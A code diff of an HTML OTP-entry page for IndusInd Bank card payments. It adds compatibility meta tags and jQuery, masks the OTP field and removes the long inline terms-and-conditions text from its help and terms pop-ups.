@@ -2,12 +2,14 @@
 <!-- saved from url=(0014)about:internet -->
 <html lang="en">
   <head>
+    <!-- <meta http-equiv="X-UA-Compatible" content="IE=9" /> -->
+    <meta http-equiv="X-UA-Compatible" content="IE=IE8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Indusind Bank Otp Page</title>
     <link href="./style.css" rel="stylesheet" />
+    <script src="./jquery-3.5.1.min.js"></script>
   </head>
   <body>
     <div class="parent-container">
@@ -47,7 +49,7 @@
                   <div class="inner-sub-container2">
                     <input
                       class="inpt"
-                      type="text"
+                      type="password"
                       maxlength="6"
                       inputmode="numeric"
                       placeholder="Enter OTP"
@@ -136,8 +138,8 @@
                 <img class="logo6" src="./visa_sm_logo.jpg" />
               </div>
               <div class="sub-container2-pwd">
-                <p>Powered by</p>
                 <img class="logo7" src="./m2p_logo.png" />
+                <p>Powered by</p>
               </div>
             </div>
           </div>
@@ -171,13 +173,14 @@
         </div>
         <div class="model-pad"></div>
       </div>
-      <div class="back-drop"></div>
-      <div class="model-cfrm">
-        <div><p>Are you sure you want to cancel payment</p></div>
-        <div>
-          <div class="model-cfrm-1">
-            <p class="acpt">Yes</p>
-            <p class="rjt" onclick="closeCfmModel();">No</p>
+      <div class="back-drop">
+        <div class="model-cfrm">
+          <div><p>Are you sure you want to cancel payment</p></div>
+          <div>
+            <div class="model-cfrm-1">
+              <p class="acpt">Yes</p>
+              <p class="rjt" onclick="closeCfmModel();">No</p>
+            </div>
           </div>
         </div>
       </div>
@@ -199,678 +202,40 @@
       </div>
     </div>
     <script>
+      // First we get the viewport height and we multiple it by 1% to get a value for a vh unit
+      let vh = window.innerHeight * 0.01;
+      // Then we set the value in the --vh custom property to the root of the document
+      document.documentElement.style.setProperty("--vh", `${vh}px`);
+      // We listen to the resize event
+      window.addEventListener("resize", () => {
+        // We execute the same script as before
+        let vh = window.innerHeight * 0.01;
+        document.documentElement.style.setProperty("--vh", `${vh}px`);
+      });
+      // A $( document ).ready() block.
+      // $(document).ready(function () {
+      //   console.log("ready!");
+      //   alert("ready!");
+      // });
       function onlyNumberKey(evt) {
         var ASCIICode = evt.which ? evt.which : evt.keyCode;
+
         if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57)) return false;
         return true;
       }
       function modelOpenHelp() {
         document.getElementsByClassName("model")[0].style.display = "block";
 
-        document.getElementsByClassName("model-pad")[0].innerHTML = `<div
-style="
-  font-family: Trebuchet MS;
-  font-weight: 600;
-  font-size: 60%;
-  line-height: 17px;
-  height: 100%;
-"
->
-<p><h3 style="
-  text-align: center;
-  text-decoration: underline;
-  font-weight: bold;
-">TERMS AND CONDITIONS</h3></p>
-<ul style="
-list-style: none;
-"><li><p>
-  Welcome to the IndusInd Bank Verified by Visa authentication service
-  ("VbV Service"). Please read these Terms and Conditions carefully before
-  using the VbV Service.
-</p></li></ul>
-<ol>
-  <li><h3>DEFINITIONS:</h3></li>
-  <p>
-    In this document the following words and phrases have the meaning set
-    opposite them unless the context indicates otherwise:
-  </p>
-  <p>
-    "Bank" refers to IndusInd Bank Limited, a banking company incorporated
-    in India under the Companies Act, 1956 and having its registered
-    office at 2401 Gen. Thimmayya Road (Cantonment), Pune - 411 001,
-    Maharashtra, India and Corporate office at 8th Floor, Tower 1, One
-    Indiabulls Centre, 841, Senapati Bapat Marg, Elphinstone Road (W)
-    Mumbai - 400 013 and including any branch / office thereof. The term
-    includes the successors and assigns of the IndusInd Bank Limited.
-  </p>
-  <p>
-    Card" shall mean IndusInd Bank Visa Debit Card issued by the Bank to
-    the Card Holder.
-  </p>
-  <p>
-    "Card Holder "means any person holding a valid IndusInd Bank Visa
-    Debit Card issued by the Bank and who is desirous of effecting
-    payments to the Merchant using his/ her Card through the Internet.
-  </p>
-  <p>
-    "Merchant" means any person who owns or manages or operates the
-    Merchant Establishment through a website and accepts online payment
-    made by the Card Holder using the Card for the product and/or service
-    purchased through the Merchant's website.
-  </p>
-  <p>
-    "Password" means the personal identification password created by the
-    Card Holder in relation to the Debit Card and as approved by the Bank
-    from time to time for the purpose of authenticating the Card Holder
-    while effecting online payment using the Debit Card.
-  </p>
-  <p>
-    "Service" means the Verified by Visa Authentication Service offered by
-    the Bank for the purpose of authenticating the Card Holder to effect
-    online payments through the use of his / her Debit Card.
-  </p>
-  <p>
-    "User ID" means the Debit Card number furnished to the Card Holder by
-    the Bank to enable Card Holder to make Debit Card payments through the
-    Internet using the Debit Card.
-  </p>
-  <p>
-    "Website" means the website of the Bank located at the URL
-    <a href="https://www.indusind.com">https://www.indusind.com.</a>
-  </p>
-  <li>
-    <h3>ACCEPTANCE OF TERMS:</h3>
-  </li>
-  <p>
-    The VbV service shall be provided to the Card Holder, subject to the
-    following Terms and Conditions ("Terms") and the Cardholder Agreement
-    governing the card transactions for which the VbV service is and / or
-    to be used. The Terms may be updated by the Bank from time to time
-    without notice to the Card Holder. Creation of a Verified by Visa
-    account password and use of the VbV Service constitutes the acceptance
-    of the terms. In addition, when using the VbV service, the Card Holder
-    shall be subject to any amendments, modifications, revisions,
-    additional guidelines or rules applicable to the VbV service that may
-    be posted from time to time at the Bank's web site. The Card Holder
-    shall be responsible for regularly reviewing these Terms and the
-    additional terms and conditions stipulated by the Bank including
-    amendments thereto as may be posted on the Website. Continued use of
-    the VbV service after such amendments and / or revisions, issuance of
-    additional guidelines and / or rules to these Terms shall constitute
-    the Card Holder's acceptance to such revised terms and any relevant
-    guidelines or rules so posted.
-  </p>
-  <p>
-    Notwithstanding anything contained herein, these terms are in addition
-    and not in derogation of the terms and conditions as stipulated by the
-    Bank with regard to the Debit Card and/or to any services/facilities
-    so offered. However, in the event of a conflict with any other terms
-    and conditions of the Bank and the Terms herein, the Terms shall have
-    an overriding effect.
-  </p>
-  <p>
-    The Bank reserves the right at any time and from time to time to
-    modify or discontinue, temporarily or permanently, the VbV service (or
-    any part thereof) with or without notice.
-  </p>
-  <li>
-    <h3>SERVICE:</h3>
-  </li>
-  <p>
-    VbV Service provides the Card Holder with a way of increasing security
-    in online and other transactions for which VbV Service is used, by
-    reducing the chances of fraud for those transactions. Registering for
-    VbV Service involves providing personal information to the Bank, which
-    is then used to confirm Card Holder identity in connection with future
-    online transactions or other transactions for which VbV Service is
-    used.
-  </p>
-  <p>
-    Registering for the VbV Service entails the Card Holder departing with
-    his or her personal information and Debit Card details to the Bank. It
-    is hereby understood and informed that such personal information and
-    Debit Card Details may be used for various purposes to effectuate and
-    operationalise the VbV service for the Card Holder such as amongst
-    others, confirmation of the Card Holder's identity in respect of all
-    the transactions, for record retention and reporting, as well as to
-    enable and / or assist the Bank in any transaction related dispute
-    resolution.
-  </p>
-  <p>
-    The Bank shall thereafter validate the Debit Card and personal details
-    provided by the Card Holder to enable the latter to create the
-    Password. In the event any of the personal or Debit Card details of
-    the Card Holder is not as per the records available with the Bank, the
-    Bank shall at its sole discretion reject the creation of the Password
-    by the Card Holder and the Card Holder shall be required to update his
-    personal and Debit Card details with the Bank in the manner prescribed
-    by the Bank. The Debit Card number shall be the User ID for the
-    purposes of authentication of the Card Holder
-  </p>
-  <p>
-    On successful creation of the Password by the Card Holder, the Bank
-    shall communicate to the Card Holder in this regard and in a manner as
-    shall be decided by the Bank at its sole discretion
-  </p>
-  <p>
-    The Card Holder agrees to promptly update such information and Debit
-    Card Details to keep it true, accurate, current and complete. The Bank
-    has the right to suspend, terminate, or refuse the Card Holder's
-    current or future use of the VbV Service or the Card Holder's Debit
-    Card account, if at any point of time the Bank discovers or has
-    reasonable grounds to hold that that information so provided by the
-    Card Holder is untrue, inaccurate, not current or incomplete.
-  </p>
-  <p>
-    The Card Holder must have the resources, amongst others the necessary
-    equipment including a computer and modem or other access device to
-    access the World Wide Web for using the VbV service and must pay any
-    service fees pertaining to such access.
-  </p>
-  <li>
-    <h3>CONFIDENTIALITY OF INFORMATION:</h3>
-  </li>
-  <p>
-    Personal Information will not be shared with online retail merchants
-    or merchants in other transactions for which the VbV Service is used,
-    however any information of the Card Holder so furnished to the Bank,
-    for the purposes of the VbV service may be disclosed if required to do
-    so by applicable laws and / or statutory authorities, in the good
-    faith and belief that such preservation or disclosure is permitted by
-    applicable Law, or as reasonably necessary to (i) comply with legal
-    process or (ii) enforce these Terms.
-  </p>
-  <li>
-    <h3>LIABILITY:</h3>
-  </li>
-  <p>
-    Under no circumstances will the Bank be liable for any direct,
-    consequential, incidental, special or indirect losses or other
-    damages, such as any damage to the Card Holder's computer or telephone
-    service resulting from the Card Holder's use of the VbV Service. The
-    Bank assumes no responsibility for, and will not be liable for, any
-    damages to, or any viruses which may affect, the Card Holder's
-    computer equipment or other property on account of his or her access
-    to, use of the VbV Service. The Bank does not guarantee to the Card
-    Holder that the VbV Service would be virus free.
-  </p>
-  <li>
-    <h3>TERMINATION:</h3>
-  </li>
-  <p>
-    If the Card Holder no longer desires to use the VbV Service, Card
-    Holder will be required to call the Bank's Customer Care Centre for
-    the Password and Registration Data with Verified by Visa to be
-    deactivated. Any purchases made by the Card Holder using the VbV
-    Service prior to deactivation will not be affected.
-  </p>
-  <p>
-    The Bank reserves discretion to temporarily or permanently deactivate
-    and / or terminate the Card Holder's ability to use the VbV Service
-    without assigning any reasons whatsoever.
-  </p>
-  <li>
-    <h3>RELATIONSHIP WITH MERCHANTS:</h3>
-  </li>
-  <p>
-    The Card Holder's communications or business dealings with, or
-    participation in promotions of, schemes of, online retail or other
-    merchants on or through the VbV Service, including payment and
-    delivery of related goods or services, and any other terms,
-    conditions, warranties or representations associated with such
-    dealings, are exclusively between the Card Holder and such merchant.
-    The Bank shall not be responsible or liable for any loss or damage of
-    any sort incurred as the result of any such dealings. By virtue of
-    offering the VbV service, the Bank does not in any manner recommend or
-    endorse any merchant or certify the quality of the products and / or
-    services so offered, regardless of whether the merchant participates
-    in Verified by Visa.
-  </p>
-  <li>
-    <h3>DISCLAIMER OF WARRANTIES:</h3>
-  </li>
-  <p>
-    The Card Holder understands and expressly agrees that use of the
-    Website is at his / her entire risk. The Website is provided on an "as
-    is" and "as available" basis. Except as warranted in the Terms herein,
-    the Bank expressly disclaims all warranties of any kind, whether
-    express or implied or statutory, including, but not limited to the
-    implied warranties of merchantability, fitness for a particular
-    purpose, data accuracy and completeness, and any warranties relating
-    to non-infringement in the VbV Service provided by the Bank.
-  </p>
-  <p>
-    The Bank does not warrant that access to the Website and VbV Service
-    shall be uninterrupted, timely, secure, or error free nor does it make
-    any warranty as to the results that may be obtained from the Website
-    or use, accuracy or reliability of the Service.
-  </p>
-  <li>
-    <h3>CHARGES:</h3>
-  </li>
-  <p>
-    The Bank reserves the right to charge and recover from the Card
-    Holder, service charges / other applicable charges for providing the
-    VbV Service. The Card Holder hereby authorizes the Bank to recover the
-    service charges by debiting the account linked to the Card of the Card
-    Holder.
-  </p>
-  <li>
-    <h3>NOTICES:</h3>
-  </li>
-  <p>
-    Notices to the Card Holder in respect of the VbV Service may be made
-    either via email or regular mail to the address that the Card Holder
-    has provided to the Bank in connection with the Card Holder's accounts
-    with the Bank or his / her Debit card issued by the Bank.
-  </p>
-  <li>
-    <h3>GENERAL TERMS:</h3>
-  </li>
-  <p>
-    The Card Holder represents being of sufficient legal age to use the
-    VbV Service and to create binding legal obligations for any liability,
-    the Card Holder may incur arising on account of the usage of the VbV
-    Service. The Card Holder shall be fully responsible for all uses of
-    the VbV Service and shall ensure adherence to all applicable laws
-    while using this service.
-  </p>
-  <p>
-    The Card Holder acknowledges, represents and warrants that the Card
-    Holder is the sole and exclusive owner and is the only authorised user
-    of the Password and accepts sole responsibility for use,
-    confidentiality and protection of the Password.
-  </p>
-  <p>
-    The Card Holder grants express authority to the Bank for carrying out
-    transactions and instructions authenticated by such Password. The Card
-    Holder unconditionally and irrevocably undertakes to have the Password
-    of such number of characters as may be notified by the Bank from time
-    to time and ensure that the same is kept confidential; and to not let
-    any other unauthorized person have access to the Password while the
-    Card Holder is purchasing the products and/or services from the
-    Merchant's website. If the Card Holder forgets the Password, then the
-    Card Holder may request for the issue of a new Password in the manner
-    as required by the Bank from time to time and this shall not be
-    construed as the commencement of a new contract. The Card Holder
-    agrees and acknowledges that the Bank shall in no way be held
-    responsible or liable if the Card Holder incurs any loss as a result
-    of information being disclosed regarding his Debit Card(s) or the Bank
-    processing the instruction of the Card Holder. The Card Holder shall
-    fully indemnify and hold harmless the Bank in this regard. The Card
-    Holder shall maintain the secrecy of all information of confidential
-    nature and shall ensure that the same is not disclosed to any person
-    voluntarily, accidentally or by mistake. The Card Holder agrees and
-    acknowledges that any loss, damage, liability caused or suffered by
-    the Card Holder due to disclosure of all information of confidential
-    nature shall be borne exclusively by the Card Holder.
-  </p>
-  <p>
-    In the event the Card gets blocked after a number of incorrect
-    Password attempts, up to such number as may be intimated by the Bank
-    from time to time, the Card Holder shall be required to contact the
-    Bank's Customer Care Centre and request for unblocking of his Debit
-    Card after successfully authenticating himself.
-  </p>
-  <p>
-    The Card Holder is aware that in case of online payment using the
-    Debit Card over the Internet, the Card Holder will not sign the
-    charge-slips at the time of making the online payment. Accordingly,
-    the Card Holder accepts that, in the event of any dispute regarding
-    the authenticity or validity of such a payment after being
-    authenticated through the VbV Service, for any reason whatsoever, in
-    the event of the Card Holder's account already been debited, the Card
-    Holder shall not hold Bank liable for the amount paid. The Bank shall
-    not be liable, in any manner whatsoever, for the same.
-  </p>
-  <p>
-    The Card Holder shall be solely responsible for the payments made
-    through the Internet even in the event of the Card Holder claiming
-    non-possession of the Card with him/her. The Card Holder shall further
-    be solely responsible for any payments made using the Card through the
-    Internet for any purposes and cannot claim the invalidity of the same.
-  </p>
-  <p>
-    The Card Holder agrees and acknowledges that the Bank shall in no way
-    be held responsible or liable if the Card Holder incurs any loss as a
-    result of processing the instruction of the Card Holder pursuant to
-    the verification through the Password and the Card Holder shall fully
-    indemnify and hold harmless the Bank in this regard.
-  </p>
-  <p>
-    Any payments effected through the Internet using the Card Holder's
-    Password shall be deemed to be an instruction received from the Card
-    Holder itself. The use of the Card by the Card Holder for making
-    payments in terms of the VbV Service is at the Card Holder's own risk
-    and is the Card Holder's sole responsibility.
-  </p>
-  <p>
-    The Card Holder shall indemnify and hold the Bank, including its
-    officers, employees and agents, indemnified against all losses, costs,
-    penalties, and expenses which the Bank may incur, sustain, suffer or
-    is likely to suffer in connection with the execution of the Card
-    Holder's instructions and against all actions, claims, demands,
-    proceedings, losses, damages, costs, charges and expenses as a
-    consequence or by reason of providing the VbV Service.
-  </p>
-  <p>
-    The Bank has no obligation to verify the authenticity of any payment
-    made from the Card Holder's Password other than by means of
-    verification of the Card Holder's Password.
-  </p>
-  <li>
-    <h3>PROPRIETARY RIGHTS:</h3>
-  </li>
-  <p>
-    The Bank shall endeavor to advise from time to time the software such
-    as browsers, which are required for availing of the VbV Service. There
-    will be no obligation on the part of the Bank to support all or any
-    versions of the software as may be required for offering the VbV
-    Service. The Card Holder acknowledges that the software underlying the
-    VbV Service is the legal property of the respective vendors. The
-    permission given by the Bank to access the VbV service will not convey
-    any proprietary or ownership rights in such software. The Card Holder
-    shall not attempt to modify, translate, disassemble, decompile or
-    reverse engineer the software underlying the VbV Service or create any
-    derivative product based on the software.
-  </p>
-</ol>
-</div>`;
+        // document.getElementsByClassName("model-pad")[0].innerHTML = ``;
       }
       function modelOpenTerms() {
         document.getElementsByClassName("model")[0].style.display = "block";
 
-        document.getElementsByClassName(
-          "model-pad"
-        )[0].innerHTML = `    <div  style="
-              font-family: Trebuchet MS;
-              font-weight: 600;
-              font-size: 60%;
-              line-height: 17px;
-              padding: 6px;
-              height: 100%;
-            ">
-      <h3>Terms and Conditions for IBL e-Secure Service</h3>
-      <p>
-        Please read the following Terms and Conditions carefully before using
-        IBL e-Secure service.In this Agreement, "Issuer" refers to the Financial
-        Institution that issued your Credit Card, i.e. IndusInd Bank; "we,"
-        "us," and "our" refer to Issuer and its suppliers of card processing and
-        web-hosting services; and "you", "your", or "yours" refers to the
-        Cardholder using IBL e-Secure service.
-      </p>
-      <ol>
-        <li>
-          The Terms and Conditions set out herein are in addition to the
-          Issuer’s General Terms and Conditions applicable for IndusInd Bank
-          Credit Cards
-        </li>
-        <li>
-          The following words and phrases shall have the following meanings in
-          these Terms and Conditions:
-          <ol type="a">
-            <li>
-              "Card" means an international Credit Card issued by the Issuer in
-              association with Visa International/
-              MasterCard®.
-            </li>
-            <li>
-              "Cardholder" means any person holding a valid Card issued by the
-              Issuer and who desires to make payments to the Merchant over the
-              Internet using the Card.
-            </li>
-            <li>
-              "Merchant" means any person who owns or manages or operates the
-              merchant establishment through a physical establishment and/or a
-              website.
-            </li>
-            <li>
-              These Terms and Conditions form a contract between the Cardholder
-              and the Issuer for use of IBL e-Secure Service. By using the IBL
-              e-Secure Service, the Cardholder shall be deemed to have accepted
-              these Terms and Conditions.
-            </li>
-          </ol>
-        </li>
-        <li>
-          IBL e-Secure service lets you shop online securely with your IndusInd
-          Bank Credit Card, which may be used only on merchant websites that
-          subscribe to services of "Verified by Visa
-          <sup style="vertical-align: top; font-size: 6px">TM</sup>" (VbV) or
-          MasterCard® SecureCode security platform ."
-        </li>
-        <li>
-          IBL e-Secure service enables you to authenticate yourself at the time
-          of purchase by using the OTP sent on the registered Mobile Number and
-          Email ID, and protects your IndusInd Bank Credit Card against
-          unauthorised usage.
-        </li>
-        <li>
-          The Issuer shall validate the Card details provided by the Cardholder
-          during the course of a transaction directly and the Merchant will not
-          be privy to the same.
-        </li>
-        <li>
-          IBL e-Secure service shall be provided at the discretion of the
-          Issuer, which reserves the right to add, revise, suspend in whole or
-          in part any of the services provided by IBL e-Secure service, without
-          any notice and it shall be binding on the Cardholder.
-        </li>
-        <li>
-          The Cardholder is aware that in case of payment over the Internet
-          using his Card, the Cardholder will not sign the charge-slips at the
-          time of making the payment. Accordingly, the Cardholder accepts that,
-          in the event of any dispute regarding the authenticity or validity of
-          such a payment, for any reason whatsoever, the Cardholder's account
-          shall be liable to be debited with the amount payable if the
-          transaction was properly authorized by the Issuer/Visa International/
-          MasterCard. The Issuer shall not
-          be liable, in any manner whatsoever, for the same.
-        </li>
-        <li>
-          Please note that if the Cardholder tries using his/her Card at a
-          merchant website that does not subscribe to Verified by Visa or
-          MasterCard SecureCode, then the
-          transaction will get processed as a normal online payment. The Issuer
-          shall not be liable, in any manner whatsoever, for the same.
-        </li>
-        <li>
-          The Cardholder shall be solely responsible for the payments made
-          through the Internet even in the event of the Cardholder claiming
-          non-possession of the Card. The Cardholder shall further be solely
-          responsible for any payments made using the Card through the Internet
-          for travel and entertainment purposes and cannot claim the invalidity
-          of the same.
-        </li>
-        <li>
-          Any payment made on the Internet using the OTP shall be deemed to be
-          an instruction duly received from the Cardholder. The OTP requested by
-          the Cardholder allows the Cardholder to make payments through Internet
-          and that the Cardholder is the sole and exclusive owner of the OTP and
-          accepts sole responsibility for use, confidentiality and protection of
-          the OTP, as well as for all payments made using such OTP. The use of
-          the Card by the Cardholder for making payments on the website is at
-          the Cardholder's own risk and is the Cardholder's sole responsibility.
-        </li>
-        <li>
-          The Cardholder shall indemnify and hold the Issuer, including its
-          officers, employees and agents, against all losses and expenses on
-          full indemnity basis, which the Issuer may incur, sustain, suffer or
-          is likely to suffer in connection with the execution of the
-          Cardholder's instructions and against all actions, claims, demands,
-          proceedings, losses, damages, costs, charges and expenses as a
-          consequence or by reason of providing the IBL e-Secure service.
-        </li>
-        <li>
-          The Issuer has no obligation to verify the authenticity of any payment
-          made from the Card other than by means of validation of the OTP sent
-          by the Issuer.
-        </li>
-        <li>
-          All disputes, if any, arising out of or in connection with, or as a
-          result of these Terms and Conditions or otherwise relating hereto,
-          shall be subject to the exclusive jurisdiction of the competent
-          courts/tribunals in Mumbai only.
-        </li>
-      </ol>
-      <h3>Terms and Conditions for Indus Easy EMI</h3>
-      <h3>General Terms and Conditions</h3>
-      <p>
-        In these Terms and Conditions, the following terms shall have the
-        following meanings:
-      </p>
-      <ul>
-        <li>
-          Credit Card shall mean an unexpired Credit Card issued by IndusInd
-          Bank Ltd.; excluding IndusInd Bank Corporate Credit Card
-        </li>
-        <li>Cardholder shall mean the holder of a Credit Card</li>
-        <li>
-          The present Terms and Conditions are to be read in conjunction with,
-          and not in derogation of, the Cardholder Agreement. Terms & Conditions
-          and nothing contained herein shall prejudice or affect the terms and
-          conditions of the Cardholder Agreement
-        </li>
-        <li>
-          Unless otherwise specified, the words and expressions used herein
-          shall have the same meaning as in the Cardholder Agreement
-        </li>
-      </ul>
-      <h3>Terms and Conditions for Indus Easy EMI</h3>
-      <ul>
-        <li>
-          The Bank provides the Cardholder a facility in addition to the
-          existing modes of effecting payment for charges incurred on the card;
-          (i) the option of paying for certain purchases through Equated Monthly
-          Instalments (hereinafter referred to as Transaction to EMI). (ii) the
-          option of paying the Credit Card outstanding (equivalent to the
-          purchase outstanding), hereinafter referred to as Outstanding to EMI.
-        </li>
-        <li><h3>Terms and Conditions for Transaction to EMI</h3></li>
-        <li>
-          Purchase transactions of INR. 2000 or more can be converted for
-          payment through Equated Monthly Instalments. This minimum and maximum
-          amount will be specified by IndusInd Bank from time to time.
-        </li>
-        <li>
-          Request for conversion of transaction into EMI can be placed within 45
-          days from the date of purchase. Requests raised after 45 days of
-          purchase will not be converted into EMI
-        </li>
-        <li>
-          The EMI facility is available for transactions above INR 2,000. The
-          Cardholder can choose between tenure options 6, 12, 18 and 24 months.
-        </li>
-        <li>
-          Only purchase transactions towards which payment is not received /
-          apportioned shall be eligible for conversion into EMI
-        </li>
-        <li>
-          The EMI facility offered by IndusInd Bank shall be subject to levy of
-          a transaction / processing fee and interest charges. The processing
-          fee and interest charges will be specified by IndusInd Bank from time
-          to time.
-        </li>
-        <li>
-          For all subsequent statements of the Cardholder, until the tenor of
-          the loan gets over, the EMI will be billed as part of Minimum Amount
-          Due for that particular card.
-        </li>
-        <li>
-          Once a Cardholder has opted for payment by EMI's, any subsequent
-          change will attract a pre-closure charge of 3% on the Principal
-          Outstanding of the loan. The pre-closure charges will be specified by
-          IndusInd Bank from time to time. Any request for change in the EMI
-          facility opted for has to be made in writing or by calling the 24 Hour
-          helpline number.
-        </li>
-        <li>
-          Upon pre-closure of the loan, the entire principal outstanding will be
-          billed to the Cardholder. If the Cardholder chooses not to pay the
-          entire amount and opts to revolve, then the entire amount will accrue
-          interest as per the schedule of charges.
-        </li>
-        <li>
-          In case any portion of the billed and outstanding charges is not
-          permitted to be paid in EMIs or such portion is not paid by the
-          payment due date, the same will attract a late payment fee and
-          interest charges as per the schedule of charges
-        </li>
-        <li>
-          During the running period of EMI's, the Cardholder cannot close the
-          IndusInd Bank Credit Card. However, if he/she does so before all
-          instalments have been billed, the outstanding EMI Principal amount
-          will be billed to the card account as one consolidated amount and
-          interest charges as per schedule of charges will be applicable on such
-          amount.
-        </li>
-        <li>
-          IndusInd Bank reserves the right to foreclose the loan and debit the
-          entire outstanding amount to customer's Credit Card account, if the
-          customer defaults on payment towards the Credit Card Account.
-        </li>
-        <li>
-          The amount of transaction fee and charges, tenure for the payment of
-          EMIs and other payment particulars will be card holder specific, as
-          ascertained by the Bank.
-        </li>
-        <li>
-          IndusInd Bank reserves the right at any time without previous notice
-          to add, alter, modify, change or vary all or any of these terms and
-          conditions or to replace, wholly or in part, this scheme by another
-          scheme, whether similar to this scheme or not, or to withdraw it
-          altogether. Which if done shall be binding on the cardholder and the
-          cardholder shall abide by the said rules. If withdrawn, those who have
-          opted shall continue to get the right to pay through EMIs for the
-          already approved conversion.
-        </li>
-        <li>
-          Final approval of such conversion shall be at the sole discretion of
-          IndusInd Bank and is subject to the performance on the Credit Card.
-        </li>
-        <li>
-          Final approval for any cash back program shall be at the sole
-          discretion of IndusInd Bank and is subject to the Cardholder
-          performance on the Credit Card.
-        </li>
-        <li>
-          Cash back amount will be applicable only on specific purchase
-          transactions and the customer has to opt for the same at the time of
-          availing Easy EMI facility.
-        </li>
-        <li>
-          The cash back amount shall be credited to the Credit Card account of
-          the customer only on successful completion of the EMI tenure. The
-          fulfilment may take up to 60 business days after the loan completion
-          date.
-        </li>
-        <li>
-          If the Easy EMI loan is pre-closed for any reason or the original
-          transaction is cancelled/refunded, the customer will not be eligible
-          for cash back.
-        </li>
-        <li>
-          The Cardholder will not hold the Bank responsible or liable for any
-          actions, claims, demands, losses, damages, costs, charges, and
-          expenses that he/she may suffer, sustain or incur by way of this
-          scheme.
-        </li>
-        <li>
-          GST, as notified by the Government of India, is applicable on
-          processing fee, preclosure fee and interest component of the EMI, and
-          is subject to change as per relevant regulations of the Government of
-          India.
-        </li>
-        <li>
-          Nothing contained herein should be construed as an obligation on
-          IndusInd Bank to offer the above mentioned products.
-        </li>
-      </ul>
-    </div>`;
+        // document.getElementsByClassName("model-pad")[0].innerHTML = ``;
       }
       function modelClose() {
         document.getElementsByClassName("model")[0].style.display = "none";
-        document.getElementsByClassName("model-pad")[0].innerHTML = "";
+        // document.getElementsByClassName("model-pad")[0].innerHTML = "";
       }
       function modelCfrmOpen() {
         document.getElementsByClassName("model-cfrm")[0].style.display = "flex";
